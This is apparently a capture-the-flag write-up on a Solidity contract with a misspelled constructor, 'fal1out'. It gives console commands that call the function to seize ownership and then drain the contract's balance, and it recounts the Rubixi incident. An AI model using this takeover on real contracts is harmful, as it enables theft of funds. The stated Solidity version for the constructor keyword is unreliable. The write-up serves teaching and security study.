There is a fatal error here, that is the constructor's name is misspelled , of course ,
when the version of solidity is updated to 0.6.2,the function of constructor is used to replace the previous version.

If we wanna get the Owner's permissions, we just only call the fal1out and make the permission exchange.
After get the permission, we can call collectAllocations withdraw all the balance in this smart contract.

await contract.owner()
//check the owner at this time
await contract.fal1out()
//call this error func to change the permission
await contract.owner()
//check again the owner, you will see the permissions changed.

The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
